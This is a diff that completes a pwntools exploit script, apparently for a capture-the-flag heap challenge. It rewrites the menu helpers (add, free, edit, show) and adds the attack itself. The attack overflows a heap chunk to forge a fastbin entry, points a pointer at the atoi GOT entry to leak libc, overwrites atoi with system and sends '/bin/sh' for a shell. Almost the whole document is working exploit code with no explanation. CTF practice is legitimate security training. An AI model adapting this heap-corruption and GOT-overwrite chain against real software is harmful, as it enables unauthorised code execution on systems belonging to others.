@@ -56,27 +56,40 @@ def dbg():
 	gdb.attach(p)
 	pause()
 
-_add,_free,_edit,_show = 1,4,2,3
-def add(index,content='a'*8):
-	sla(':',_add)
-	sla(':',index)
+_add,_free,_edit,_show = 2,4,3,1
+def add(size,content='a'*8):
+	sla('choice:',_add)
+	sla(':',size)
 	sa(':',content)
 
 def free(index):
-	sla(':',_free)
+	sla('choice:',_free)
 	sla(':',index)
 
-def edit(index,content):
-	sla(':',_edit)
+def edit(index,size,content):
+	sla('choice:',_edit)
 	sla(':',index)
+	sla(':',size)
 	sa(':',content)
 
-def show(index):
-	sla(':',_show)
-	sla(':',index)
+def show():
+	sla('choice:',_show)
 
 # start
+fake = 0x6020ad
+add(0x60)
+add(0x60)
+free(1)
 
+edit(0,0x100,flat('a'*0x60,0,0x71,fake))
+add(0x60) # 1
+add(0x60, flat('a'*3, 0x100, elf.got['atoi']))
+show()
+ru(': ')
+atoi = uu64(r(6))
+base,libc,system = leak_libc('atoi',atoi,libc)
+edit(0,0x8,p64(system))
+sla(':', '/bin/sh\x00')
 # end
 
 p.interactive()
